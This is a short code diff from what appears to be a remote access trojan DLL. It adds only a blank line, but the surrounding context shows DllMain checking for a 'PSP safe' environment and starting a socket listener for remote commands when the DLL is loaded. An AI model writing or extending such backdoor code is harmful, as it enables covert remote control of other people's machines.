@@ -18,6 +18,7 @@ INT APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
         {
             sprintf_s(msgBuf, "RAT-Dll-Main::DllMain - Detected process attach; assumping enironment is PSP safe and starting socket listen on port %d", PORT_NUM);
             OutputDebugStringA(msgBuf);
+
             // Pass control to our listening function and wait for user input 
             status = startListen();
             if (status != SUCCESS)
